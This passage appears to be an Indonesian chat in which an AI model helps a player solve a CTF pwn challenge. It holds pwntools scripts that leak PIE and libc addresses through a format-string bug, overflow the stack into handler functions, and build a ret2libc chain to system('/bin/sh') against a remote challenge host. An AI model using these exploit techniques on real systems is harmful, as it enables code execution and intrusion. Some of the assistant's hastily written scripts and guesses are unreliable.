+6: input kita
+...
+20: 0x55a4be1ff5cd     ← PIE
+
+Jadi %20$p → PIE. ✅
+
+2. Kalau env gak di-set, handler cuma print:
+text
+
+With this, you can buy anything in the world
+Your result has been updated. Refresh the Result page.
+
+Gak ada flag.
+
+3. Kalau env di-set, handler bakal connect & kirim HTTP request. Flag datang dari server, bukan program.
+🔥 Coba dulu:
+bash
+
+# Terminal 1: listener
+nc -lvnp 9999
+
+# Terminal 2: jalankan chall dengan env
+RESULT_HOST=127.0.0.1 RESULT_PORT=9999 RESULT_KEY=test python3 exploit.py
+
+Atau — kalau ini remote challenge, biasanya env udah di-set di server. Tinggal kirim payload ke remote.
+💡 TAPI — ada kemungkinan lain
+
+"Right path" mungkin bukan handler. Mungkin:
+
+    Handler cuma print (env gak di-set) → gak guna
+
+    Flag ada di server → butuh connect ke server yang bener
+
+    Ada path tersembunyi di server → /internal/flag, /flag, dll
+
+Coba juga: setelah leak PIE, cek string di binary untuk path menarik:
+bash
+
+strings chall | grep -iE "flag|/internal|/secret|/admin"
+
+Dari .rodata tadi, path cuma /internal/result/%s. Tapi mungkin ada path lain yang di-hardcode di server.
+🎯 Kalau semua handler gagal:
+
+Balik ke ret2libc:
+
+    Leak libc (offset 1)
+
+    Hitung libc base
+
+    ROP: pop rdi; ret (dari libc) → /bin/sh → system
+
+Tapi butuh gadget pop rdi; ret dari libc. Cek:
+bash
+
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" | head -3
+
+🚀 Gas jalanin script brute force dulu!
+
+Share output-nya — apakah ada handler yang ngasih output beda? 🔥
+apa ini scriptlu ga bisa jalan gini
+
+WKWKWK iya maap, gue nulis script asal-asalan. Masalahnya:
+
+    p.recvuntil(b'Why do you wish to start over? ') dipanggil 2x — padahal prompt itu cuma muncul sekali
+
+    Output format string keluar di line yang sama dengan prompt
+
+    Parsing leak-nya kacau
+
+🔧 Ini yang bener:
+python
+
+from pwn import *
+
+context.log_level = 'info'
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+PIE_LEAK_OFFSET = 0x15cd
+RIP_OFFSET = 72
+
+def try_handler(name, handler_off):
+    p = process('./chall')
+    
+    # Fase 1: format string — prompt muncul SEKALI
+    p.recvuntil(b'Why do you wish to start over? ')
+    p.sendline(b'%20$p')
+    
+    # Output: "<leak>\nInput : "
+    data = p.recvuntil(b'Input : ', timeout=2)
+    log.info(f'[{name}] raw: {data}')
+    
+    # Ambil hex pertama
+    leak = int(data.split(b'\n')[0].strip(), 16)
+    pie_base = leak - PIE_LEAK_OFFSET
+    log.success(f'[{name}] leak={hex(leak)} pie_base={hex(pie_base)}')
+    
+    # Fase 2: overflow
+    handler = pie_base + handler_off
+    payload = b'A' * RIP_OFFSET + p64(handler)
+    p.sendline(payload)
+    
+    # Baca output
+    try:
+        out = p.recvall(timeout=3)
+        print(f'\n===== [{name}] =====')
+        print(out.decode('latin-1', errors='replace'))
+    except Exception as e:
+        print(f'[{name}] error: {e}')
+    p.close()
+
+for name, off in HANDLERS.items():
+    try_handler(name, off)
+
+⚠️ Tapi — lu belum konfirmasi leak PIE offset 20
+
+Dari run lu tadi, %20$p belum pernah lu tes. Yang lu tes %1$p.%2$p...%30$p — hasilnya cuma nampilin 4 nilai karena shell manggil $p sebagai variable (makanya jadi ... doang).
+
+Tes dulu yang bener:
+bash
+
+echo '%20$p' | ./chall
+# atau
+printf '%%20$p\n' | ./chall
+
+Perhatiin: pakai printf biar $p gak di-expand shell.
+
+Atau lebih gampang — pakai script:
+python
+
+p = process('./chall')
+p.recvuntil(b'Why do you wish to start over? ')
+p.sendline(b'%20$p')
+print(p.recvall(timeout=2))
+
+🤔 Kemungkinan lain: offset 20 bukan PIE
+
+Dari run pertama lu:
+text
+
+20: 0x55a4be1ff5cd
+
+Itu PIE — karena 0x55... = typical PIE base. Tapi offset 20 itu tergantung posisi stack. Coba tes %20$p langsung.
+🔥 Script fix + verifikasi:
+python
+
+from pwn import *
+
+# 1. Verifikasi leak dulu
+p = process('./chall')
+p.recvuntil(b'Why do you wish to start over? ')
+p.sendline(b'%1$p|%2$p|%3$p|%6$p|%20$p')
+data = p.recvall(timeout=2)
+print(data.decode('latin-1', errors='replace'))
+p.close()
+
+Share output ini — biar kita tau offset berapa yang bener buat PIE & libc.
+
+Setelah itu baru rakit exploit final. Gas! 🔥
+19 woilah
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ echo '%20$p' | ./chall
+====================================================================
+If you can start over life and get an upgrade, what will you choose?
+====================================================================
+Why do you wish to start over? (nil)
+
+Input : May your choice not lead to your doom
+                                                                       
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ echo '%19$p' | ./chall
+====================================================================
+If you can start over life and get an upgrade, what will you choose?
+====================================================================
+Why do you wish to start over? 0x56103ad875cd
+
+Input : May your choice not lead to your doom
+                                                                       
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ echo '%18$p' | ./chall
+====================================================================
+If you can start over life and get an upgrade, what will you choose?
+====================================================================
+Why do you wish to start over? 0x7fff90bc2f40
+
+Input : May your choice not lead to your doom
+
+MANTAP! Offset 19 = PIE leak (0x56103ad875cd)! 🎯
+🔧 Fix Script — pakai %19$p
+python
+
+from pwn import *
+
+context.log_level = 'info'
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+PIE_LEAK = 0x15cd   # offset dari leak ke PIE base
+RIP_OFFSET = 72
+
+def try_handler(name, handler_off):
+    p = process('./chall')
+    
+    p.recvuntil(b'Why do you wish to start over? ')
+    p.sendline(b'%19$p')
+    
+    data = p.recvuntil(b'Input : ', timeout=2)
+    leak = int(data.split(b'\n')[0].strip(), 16)
+    pie_base = leak - PIE_LEAK
+    handler = pie_base + handler_off
+    log.success(f'[{name}] leak={hex(leak)} base={hex(pie_base)} handler={hex(handler)}')
+    
+    payload = b'A' * RIP_OFFSET + p64(handler)
+    p.sendline(payload)
+    
+    try:
+        out = p.recvall(timeout=3)
+        print(f'\n===== [{name}] =====')
+        print(out.decode('latin-1', errors='replace'))
+    except Exception as e:
+        print(f'[{name}] error: {e}')
+    p.close()
+
+for name, off in HANDLERS.items():
+    try_handler(name, off)
+
+⚠️ Sebelum jalanin — cek offset PIE
+
+Leak 0x56103ad875cd → PIE base = leak - berapa? Kita asumsi 0x15cd (alamat setelah call fcn.00001537 di main). Tapi belum dikonfirmasi!
+
+Cek di gdb:
+bash
+
+gdb ./chall
+pwndbg> starti
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: %19$p
+# input 2: AAAA
+
+Setelah %19$p ke-print, breakpoint kena. Cek:
+bash
+
+pwndbg> vmmap
+# lihat base chall (misal 0x56103ad86000)
+# pie_base = 0x56103ad86000
+# leak = 0x56103ad875cd
+# offset = 0x15cd ✓ (kalau cocok)
+
+Kalau offset beda, ganti PIE_LEAK sesuai hasil.
+🔥 TAPI — inget masalah env
+
+Handler manggil send_result() yang:
+c
+
+if (!host || !port || !key || !*key) return;
+
+Kalau RESULT_HOST/PORT/KEY gak di-set, handler cuma print:
+text
+
+With this, you can buy anything in the world
+Your result has been updated. Refresh the Result page.
+
+Gak ada connect, gak ada flag.
+
+Kalau di-set, handler connect & kirim HTTP request. Tapi output-nya tetep sama (karena send gak nampilin response).
+🎯 Jadi kemungkinan:
+
+    Handler cuma buat trigger send_result → server yang punya flag → butuh connect ke server remote yang bener
+
+    "Right path" = path HTTP → coba ganti money/longevity/dll, salah satu path di server balikin flag
+
+    Atau... handler itu red herring, dan "right path" = ROP ke system (ret2libc)
+
+🚀 Coba dulu:
+bash
+
+# Test lokal — lihat output tiap handler
+python3 exploit.py
+
+# Test dengan env (kalau mau lihat connect)
+RESULT_HOST=127.0.0.1 RESULT_PORT=9999 RESULT_KEY=test python3 exploit.py
+# + nc -lvnp 9999 di terminal lain
+
+Share output script-nya — apakah ada handler yang output-nya beda? 🔥
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ python3 olla.py
+[+] Starting local process './chall': pid 52532
+[+] [money] leak=0x5606d0a455cd base=0x5606d0a44000 handler=0x5606d0a45433
+[+] Receiving all data: Done (138B)
+[*] Stopped process './chall' (pid 52532)
+
+===== [money] =====
+May your choice not lead to your doom
+With this, you can buy anything in the world
+Your result has been updated. Refresh the Result page.
+
+[+] Starting local process './chall': pid 52535
+[+] [longevity] leak=0x55d3dcd145cd base=0x55d3dcd13000 handler=0x55d3dcd14467
+[+] Receiving all data: Done (127B)
+[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 52535)
+
+===== [longevity] =====
+May your choice not lead to your doom
+With this, you can't possibly die
+Your result has been updated. Refresh the Result page.
+
+[+] Starting local process './chall': pid 52538
+[+] [wise_mind] leak=0x558e7ae2b5cd base=0x558e7ae2a000 handler=0x558e7ae2b49b
+[+] Receiving all data: Done (136B)
+[*] Stopped process './chall' (pid 52538)
+
+===== [wise_mind] =====
+May your choice not lead to your doom
+With this, you will be able to see through
+Your result has been updated. Refresh the Result page.
+
+[+] Starting local process './chall': pid 52541
+[+] [love] leak=0x5624971145cd base=0x562497113000 handler=0x5624971144cf
+[+] Receiving all data: Done (123B)
+[*] Stopped process './chall' (pid 52541)
+
+===== [love] =====
+May your choice not lead to your doom
+With this, you will be adored
+Your result has been updated. Refresh the Result page.
+
+[+] Starting local process './chall': pid 52544
+[+] [food] leak=0x55fe8b2995cd base=0x55fe8b298000 handler=0x55fe8b299503
+[+] Receiving all data: Done (129B)
+[*] Stopped process './chall' (pid 52544)
+
+===== [food] =====
+May your choice not lead to your doom
+With this, you will never be hungry
+Your result has been updated. Refresh the Result page.
+
+WKWKWK SEMUA HANDLER JALAN! 🎯 Tapi... output-nya cuma print doang. Gak ada flag, gak ada connect.
+🧠 Analisis Output:
+text
+
+[money]      → "With this, you can buy anything..."      → send_result("money")
+[longevity]  → "With this, you can't possibly die"       → send_result("longevity")  ← SIGSEGV!
+[wise_mind]  → "With this, you will be able to see through" → send_result("wise_mind")
+[love]       → "With this, you will be adored"           → send_result("love")
+[food]       → "With this, you will never be hungry"     → send_result("food")
+
+Semua handler berhasil dipanggil! Tapi send_result langsung return karena RESULT_HOST/PORT/KEY gak di-set — makanya cuma print doang.
+
+Menarik: longevity SIGSEGV — mungkin stack alignment issue, tapi bukan masalah besar.
+🎯 "Right Path" = BUKAN handler
+
+Handler cuma distraction / dead code. Yang bener adalah... ret2libc!
+🔥 Balik ke Rencana Awal:
+text
+
+main:
+  fcn.00001537  → format string leak (input 1)
+  fgets(buf, 0x100)  → overflow (input 2)
+  ret
+
+Exploit:
+
+    Format string (input 1): leak libc + PIE
+
+    Buffer overflow (input 2): ROP chain → system("/bin/sh")
+
+Yang dibutuhin:
+
+    Leak libc (offset 1: 0x...963)
+
+    Gadget pop rdi; ret dari libc
+
+    /bin/sh dari libc
+
+    system dari libc
+
+🔧 Cari Offset Libc
+bash
+
+# 1. Cek versi libc
+strings /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
+
+# 2. Cari offset 0x...963 — dari leak
+# Leak = 0x7f...963 → ini alamat apa di libc?
+# Coba di gdb:
+gdb ./chall
+pwndbg> starti
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: %1$p
+# input 2: AAAA
+pwndbg> vmmap
+# lihat base libc
+# hitung: leak - base_libc = offset
+
+Prediksi: 0x...963 = __libc_start_main + 243 di glibc 2.36+? Atau _IO_2_1_stdin_?
+
+Dari output lu: __libc_start_main = 0x2a050. 0x2a050 + 243 = 0x2a143 — bukan 963.
+
+Coba cek:
+bash
+
+python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+# Cari symbol yg addressnya berakhiran 963
+for name, addr in libc.symbols.items():
+    if addr & 0xfff == 0x963:
+        print(name, hex(addr))
+"
+
+🔧 Cari Gadget di Libc
+bash
+
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" | head -3
+
+🎯 Full Exploit (ret2libc):
+python
+
+from pwn import *
+
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+p = process('./chall')
+
+# Fase 1: leak libc (offset 1) & PIE (offset 19)
+p.recvuntil(b'Why do you wish to start over? ')
+p.sendline(b'%1$p.%19$p')
+
+data = p.recvuntil(b'Input : ', timeout=2)
+parts = data.split(b'\n')[0].strip().split(b'.')
+libc_leak = int(parts[0], 16)
+pie_leak = int(parts[1], 16)
+
+log.info(f'libc leak: {hex(libc_leak)}')
+log.info(f'pie leak:  {hex(pie_leak)}')
+
+# Hitung base (perlu offset yg bener)
+libc_base = libc_leak - LIBC_OFFSET  # ← CARI INI
+pie_base = pie_leak - 0x15cd
+
+system = libc_base + libc.symbols['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+pop_rdi = libc_base + POP_RDI_OFFSET  # ← CARI INI
+
+log.success(f'libc base: {hex(libc_base)}')
+log.success(f'system:    {hex(system)}')
+log.success(f'/bin/sh:   {hex(binsh)}')
+
+# Fase 2: overflow
+payload = b'A' * 72
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+p.sendline(payload)
+p.interactive()
+
+⚡ Yang perlu lu cari SEKARANG:
+bash
+
+# 1. Offset libc dari leak 0x...963
+python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+for name, addr in libc.symbols.items():
+    if addr & 0xfff == 0x963:
+        print(name, hex(addr))
+"
+
+# 2. Gadget pop rdi
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" | head -3
+
+# 3. Konfirmasi base libc di gdb
+gdb ./chall
+pwndbg> starti
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: %1$p
+# input 2: AAAA
+pwndbg> vmmap
+# lihat base libc
+# hitung: leak - base = offset
+
+Share 3 output itu, langsung rakit script final! 🔥
+emng perlu libc? setau gw cuman perlu si formatstrings, area leak, sama bufferoverflow
+oh iya kan ada narik si ret tuh, kasih allignment aja alias tambahan 8 bit kalo kalo dia error masih tetep balik
+
+WKWKWK BENER BANGET! Gue kelewat lagi! 🤯
+🧠 Logika Lu Benar:
+
+Kalau handler-nya udah ada di binary (PIE), lu GAK BUTUH LIBC!
+
+Cukup:
+
+    Format string → leak PIE base
+
+    Buffer overflow → overwrite return address ke handler
+
+    Stack alignment → tambahin ret gadget kalau perlu
+
+Handler = "win function" yang udah ada di binary. Tinggal lompat ke sana. Gak perlu system, gak perlu pop rdi, gak perlu libc!
+🎯 Tapi Masalahnya:
+
+Handler cuma print doang karena send_result return awal (env gak di-set). Gak ada flag.
+🤔 Kecuali...
+
+"Right path" = handler yang bener + path HTTP yang bener. Kalau di remote, env RESULT_HOST/PORT/KEY udah di-set, maka handler bakal:
+
+    Connect ke server
+
+    Kirim POST /internal/result/<path>
+
+    Server balikin response
+
+Path yang beda-beda (money, longevity, wise_mind, love, food) → endpoint beda di server → salah satu balikin flag!
+🔥 TAPI — server balikin response ke mana?
+
+Program cuma send() request, gak baca response. Jadi flag gak bakal muncul di output program.
+
+Kecuali — lu bisa redirect ke handler yang bikin program baca response? Tapi gak ada recv di binary.
+💡 Kemungkinan Lain:
+
+    Flag ada di output server — bukan di program. Lu harus lihat traffic network (via nc listener) buat liat response server. Tapi remote...
+
+    "Right path" = overwrite return address ke fcn.0000126a dengan rdi yang lu kontrol — tapi lu butuh gadget pop rdi; ret. Di binary gak ada! Jadi butuh libc. Kecuali... ada gadget lain?
+
+    "Right path" = handler + stack alignment — lu bener, tinggal tambahin ret gadget sebelum handler. Coba yang SIGSEGV (longevity) — mungkin alignment issue.
+
+🎯 Coba Dulu:
+python
+
+# Tambah ret gadget buat alignment
+RET_GADGET = pie_base + 0x101a  # cari "ret" di binary
+payload = b'A' * 72 + p64(RET_GADGET) + p64(handler)
+
+Cari gadget ret di binary:
+bash
+
+ROPgadget --binary chall | grep ": ret$" | head -5
+
+Dari output lu tadi:
+text
+
+0x101a : ret  (kemungkinan)
+
+🔥 TAPI — Tetap Gak Ada Flag
+
+Karena handler cuma send() request, gak baca response. Flag gak bakal muncul.
+
+Kecuali:
+
+    Remote server balikin flag via HTTP response → lu harus lihat traffic (tcpdump/wireshark)
+
+    Atau ada handler yang beda — yang baca response?
+
+🤔 Cek Ulang .rodata:
+text
+
+POST /internal/result/%s HTTP/1.1
+
+Path = %s = argumen send_result. Kalau lu bisa kontrol arg1, lu bisa kirim path apapun → /internal/flag, /flag, dll.
+
+Tapi handler manggil send_result dengan konstanta. Jadi gak bisa dikontrol — kecuali lu overwrite return address ke fcn.0000126a langsung dengan rdi yang lu set.
+
+Butuh gadget pop rdi; ret. Gak ada di binary. Ada di libc. → Butuh libc!
+🎯 Kesimpulan:
+Skenario	Butuh libc?	Flag?
+Handler + alignment	❌	❌ (cuma print)
+fcn.0000126a + pop rdi	✅	✅ (kirim path apapun)
+ret2libc system	✅	✅ (shell)
+
+"Right path" = fcn.0000126a + pop rdi; ret dari libc + path /flag!
+🔥 TAPI — Coba Dulu yang Simple:
+python
+
+# Coba handler + alignment
+for name, off in HANDLERS.items():
+    for align in [0, 0x101a, 0x101b, 0x101c]:  # coba berbagai ret gadget
+        payload = b'A' * 72
+        if align: payload += p64(pie_base + align)
+        payload += p64(pie_base + off)
+        # ...
+
+Atau — kalau di remote, coba kirim payload ke remote & lihat response server (via nc atau Python socket).
+🎯 Next:
+
+    Cari gadget ret di binary buat alignment
+
+    Coba handler + alignment — apakah SIGSEGV hilang?
+
+    Kalau di remote, coba sniff traffic atau lihat response
+
+Share hasilnya! 🔥
+eduvpn gw ga bisa connect ke sana bjirrr
+ Remaining Time: 1010s
+
+nc 10.34.9.91 10081
+Result page: http://10.34.9.91:28080/r/131-8801a071-9653-4447-a925-c644d674629e/
+Instance id: 131-8801a071-9653-4447-a925-c644d674629e
+
+ini instance nya
+
+WKWKWK NAH INI DIA! Ada result page! 🎯
+🧠 Ngerti Sekarang!
+text
+
+nc 10.34.9.91 10081
+Result page: http://10.34.9.91:28080/r/131-8801a071-.../
+Instance id: 131-8801a071-...
+
+Jadi:
+
+    Lu connect ke 10.34.9.91:10081 → dapet instance
+
+    Program di sana punya env RESULT_HOST/PORT/KEY udah di-set → nunjuk ke server internal
+
+    Handler send_result(path) → kirim POST /internal/result/<path> ke server
+
+    Server balikin → result page di http://10.34.9.91:28080/r/<instance>/
+
+"Right path" = path HTTP yang bener! Lu harus kirim request ke path yang balikin flag — bukan cuma money/longevity/dll.
+🎯 Strategi:
+
+    Format string (input 1): leak PIE base
+
+    Buffer overflow (input 2): overwrite return address ke fcn.0000126a (fungsi send_result) — dengan rdi yang lu kontrol → kirim path apapun!
+
+    Path target: /flag, /internal/flag, ../../flag, dll
+
+TAPI — butuh gadget pop rdi; ret buat set rdi. Gak ada di binary. → butuh libc.
+
+ATAU — lu bisa overwrite return address ke handler yang manggil send_result dengan path konstanta. Tapi path-nya cuma 5 (money, longevity, wise_mind, love, food). Salah satu path itu mungkin balikin flag!
+🔥 Coba Dulu — Handler + Result Page:
+bash
+
+# 1. Connect ke instance
+nc 10.34.9.91 10081
+# Catat instance id & result page URL
+
+2. Kirim exploit ke instance (via Python socket):
+python
+
+from pwn import *
+context.log_level = 'debug'
+
+r = remote('10.34.9.91', 10081)
+
+# Baca banner instance
+r.recvuntil(b'Instance id: ')
+instance_id = r.recvline().strip().decode()
+log.info(f'Instance: {instance_id}')
+
+# Fase 1: leak PIE
+r.recvuntil(b'Why do you wish to start over? ')
+r.sendline(b'%19$p')
+
+data = r.recvuntil(b'Input : ', timeout=2)
+leak = int(data.split(b'\n')[0].strip(), 16)
+pie_base = leak - 0x15cd
+log.success(f'PIE base: {hex(pie_base)}')
+
+# Fase 2: overflow ke handler
+for name, off in HANDLERS.items():
+    handler = pie_base + off
+    payload = b'A' * 72 + p64(handler)
+    r.sendline(payload)
+    # Baca output
+    print(f'[{name}]', r.recv(timeout=1))
+
+3. Cek result page:
+bash
+
+curl http://10.34.9.91:28080/r/<instance_id>/
+
+🎯 TAPI — Handler cuma kirim path konstanta
+
+Path yang dikirim: money, longevity, wise_mind, love, food. Salah satu mungkin balikin flag di result page!
+
+Coba semua handler, cek result page tiap kali:
+bash
+
+# Setelah tiap handler, curl result page
+for name in money longevity wise_mind love food; do
+    echo "=== $name ==="
+    curl -s http://10.34.9.91:28080/r/$INSTANCE/
+    echo
+done
+
+🔥 Kalau Gagal — Butuh Path Injection:
+
+Overwrite return address ke fcn.0000126a dengan rdi = path yang lu mau (/flag, dll). Butuh:
+
+    Gadget pop rdi; ret → dari libc
+
+    Leak libc → dari format string (offset 1: 0x...963)
+
+Cari offset libc:
+bash
+
+python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+for name, addr in libc.symbols.items():
+    if addr & 0xfff == 0x963:
+        print(name, hex(addr))
+"
+
+⚡ Sekarang:
+
+    Connect ke instance, catat INSTANCE_ID & result page
+
+    Kirim exploit handler ke instance
+
+    Curl result page — apakah ada flag?
+
+    Kalau gak ada, coba path injection (butuh libc)
+
+Share:
+
+    Output nc 10.34.9.91 10081 (full banner)
+
+    Hasil curl result page setelah handler
+
+Gas wok, ini udah mepet banget! 🔥
+nih broo yang baru tadi gw g bisa kehubung gegara wifi gw kependekan internetnya:
+nc 10.34.9.91 10057
+Result page: http://10.34.9.91:28080/r/131-8abb7467-8c1c-4340-aaaf-2408b7e77478/
+Instance id: 131-8abb7467-8c1c-4340-aaaf-2408b7e77478
+
+WKWKWK OKE SEKARANG GAS! 🎯
+🧠 Ngerti Total Sekarang:
+text
+
+nc 10.34.9.91 10057          ← service challenge (program chall)
+Result page: http://10.34.9.91:28080/r/<instance>/  ← server internal
+
+Alur:
+
+    Program di 10.34.9.91:10057 punya env RESULT_HOST=10.34.9.91, RESULT_PORT=28080, RESULT_KEY=<secret>
+
+    Handler manggil send_result(path) → kirim POST /internal/result/<path> ke server
+
+    Server balikin response → result page di /r/<instance>/
+
+"Right path" = handler yang kirim path bener → server balikin flag di result page!
+🎯 Rencana:
+
+1. Connect ke instance, exploit handler, cek result page:
+python
+
+from pwn import *
+
+INSTANCE = '131-8abb7467-8c1c-4340-aaaf-2408b7e77478'
+RESULT_URL = f'http://10.34.9.91:28080/r/{INSTANCE}/'
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+def exploit(handler_off):
+    r = remote('10.34.9.91', 10057)
+    
+    # Fase 1: leak PIE
+    r.recvuntil(b'Why do you wish to start over? ')
+    r.sendline(b'%19$p')
+    
+    data = r.recvuntil(b'Input : ', timeout=2)
+    leak = int(data.split(b'\n')[0].strip(), 16)
+    pie_base = leak - 0x15cd
+    handler = pie_base + handler_off
+    log.success(f'PIE base: {hex(pie_base)}, handler: {hex(handler)}')
+    
+    # Fase 2: overflow
+    payload = b'A' * 72 + p64(handler)
+    r.sendline(payload)
+    
+    # Baca output
+    out = r.recvall(timeout=3)
+    print(out.decode('latin-1', errors='replace'))
+    r.close()
+
+# Coba satu-satu
+for name, off in HANDLERS.items():
+    print(f'\n===== Coba {name} =====')
+    exploit(off)
+    # Cek result page
+    import urllib.request
+    try:
+        resp = urllib.request.urlopen(RESULT_URL, timeout=5)
+        print(f'[{name}] Result page:', resp.read().decode())
+    except Exception as e:
+        print(f'[{name}] Error:', e)
+
+2. Cek result page manual:
+bash
+
+curl http://10.34.9.91:28080/r/131-8abb7467-8c1c-4340-aaaf-2408b7e77478/
+
+⚠️ TAPI — Cek Dulu:
+
+1. Result page awal (sebelum exploit):
+bash
+
+curl -s http://10.34.9.91:28080/r/131-8abb7467-8c1c-4340-aaaf-2408b7e77478/
+
+Biasanya kosong / "no result yet".
+
+2. Setelah handler money jalan, server bakal update result page.
+
+3. Cek apakah wise_mind balikin flag (paling mencurigakan — "see through").
+🔥 Kalau Handler Gagal:
+
+Path injection via fcn.0000126a + pop rdi; ret dari libc:
+
+    Leak libc (offset 1)
+
+    Cari gadget pop rdi; ret di libc
+
+    ROP: pop rdi; ret + "/flag" + fcn.0000126a
+
+Path target: /flag, /internal/flag, ../../flag, /internal/result/../../flag
+⚡ Sekarang:
+bash
+
+# 1. Cek result page awal
+curl -s http://10.34.9.91:28080/r/131-8abb7467-8c1c-4340-aaaf-2408b7e77478/
+
+# 2. Jalanin exploit handler
+python3 exploit.py
+
+# 3. Cek result page lagi
+curl -s http://10.34.9.91:28080/r/131-8abb7467-8c1c-4340-aaaf-2408b7e77478/
+
+Share output curl-nya! Kalau ada flag, jackpot! 🔥
+hahh flagnya dimana bejirr
+
+WKWKWK NAH INI PLOT TWIST-NYA! 🤯
+
+Lihat output: "Your result is still locked" — server nolak semua handler! Artinya 5 path (money, longevity, wise_mind, love, food) BUKAN "valid result"!
+
+"Right path" = path yang BENER, yang bikin server bilang "valid result" & reveal flag!
+🧠 Analisis:
+text
+
+POST /internal/result/money      → "locked"
+POST /internal/result/longevity  → "locked"
+POST /internal/result/wise_mind  → "locked"
+POST /internal/result/love       → "locked"
+POST /internal/result/food       → "locked"
+
+Server cuma anggap SATU path sebagai valid. Dan itu bukan 5 path di atas.
+🎯 "Right Path" = Kirim Path Arbitrary ke fcn.0000126a
+
+Tujuan: Overwrite return address → fcn.0000126a (fungsi send_result) dengan rdi = path yang lu mau (misal /flag, flag, result, dll).
+
+Butuh:
+
+    Gadget pop rdi; ret → gak ada di binary → butuh libc
+
+    Leak libc → dari format string (offset 1: 0x...963)
+
+🔥 FASE 1: Leak Libc + Cari Offset
+bash
+
+# 1. Cek versi libc remote — biasanya glibc 2.36+ (Debian 17.2 gdb)
+# 2. Cari offset dari leak 0x...963
+python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+# Cari symbol yg addressnya berakhiran 963
+for name, addr in libc.symbols.items():
+    if addr & 0xfff == 0x963:
+        print(name, hex(addr))
+"
+
+# 3. Cari gadget pop rdi; ret di libc
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" | head -3
+
+🔥 FASE 2: Exploit — Path Injection
+python
+
+from pwn import *
+
+# Config
+INSTANCE = '131-8abb7467-8c1c-4340-aaaf-2408b7e77478'
+RESULT_URL = f'http://10.34.9.91:28080/r/{INSTANCE}/'
+
+# Libc (sesuaikan!)
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+LIBC_LEAK_OFF = 0x...963  # ← CARI INI
+POP_RDI_OFF = 0x...        # ← CARI INI
+
+def exploit(path):
+    r = remote('10.34.9.91', 10057)
+    
+    # Fase 1: leak libc + PIE
+    r.recvuntil(b'Why do you wish to start over? ')
+    r.sendline(b'%1$p.%19$p')
+    
+    data = r.recvuntil(b'Input : ', timeout=2)
+    parts = data.split(b'\n')[0].strip().split(b'.')
+    libc_leak = int(parts[0], 16)
+    pie_leak = int(parts[1], 16)
+    
+    libc_base = libc_leak - LIBC_LEAK_OFF
+    pie_base = pie_leak - 0x15cd
+    pop_rdi = libc_base + POP_RDI_OFF
+    send_result = pie_base + 0x126a  # fcn.0000126a
+    
+    log.success(f'libc base: {hex(libc_base)}')
+    log.success(f'pop rdi:   {hex(pop_rdi)}')
+    log.success(f'send_result: {hex(send_result)}')
+    
+    # Fase 2: ROP
+    # payload = padding + pop_rdi + path_addr + send_result
+    # path_addr = alamat string path di binary/stack — bisa pakai stack
+    # TAPI path harus ada di memory...
+    # Alternatif: taruh path di buffer input 2, lalu hitung alamatnya
+    
+    # Simpel: pakai path yang ada di .rodata (misal string "/bin/sh" — gak ada)
+    # Atau taruh path di buffer & hitung alamatnya
+    # Karena stack address gak di-leak, susah...
+    
+    # SOLUSI: taruh path di buffer input 2, lalu ROP ke send_result dengan rdi = alamat buffer
+    # Tapi alamat buffer perlu di-leak juga!
+    
+    # ALTERNATIF: pakai format string buat nulis path ke memory
+    # ...
+    
+    r.close()
+
+🤔 Masalah: Path String di Memory
+
+ROP butuh rdi = alamat string path. Lu harus tau alamat string itu di memory. Opsi:
+
+    Leak stack address dari format string → hitung alamat buffer
+
+    Tulis path ke .bss via format string %n
+
+    Pakai path yang udah ada di binary — tapi gak ada /flag
+
+    Pakai pointer ke stack yang bocor
+
+Dari format string, offset 18 = stack address (0x7fff90bc2f40). Itu bisa dipakai buat hitung alamat buffer input 2!
+🔥 FASE 1 (revisi): Leak Stack + Libc + PIE
+python
+
+r.sendline(b'%1$p.%18$p.%19$p')
+# libc, stack, PIE
+
+Alamat buffer input 2 = stack_leak - offset (cari di gdb).
+⚡ Next Step:
+
+    Cari offset libc dari leak 0x...963
+
+    Cari gadget pop rdi; ret di libc
+
+    Cari offset stack — dari leak %18$p ke buffer input 2
+
+    Rakit ROP: pop rdi; ret + path_addr + fcn.0000126a
+
+    Path target: /flag, /internal/flag, flag, dll
+
+Share:
+bash
+
+# 1. Offset libc
+python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+for name, addr in libc.symbols.items():
+    if addr & 0xfff == 0x963:
+        print(name, hex(addr))
+"
+
+# 2. Gadget pop rdi
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" | head -3
+
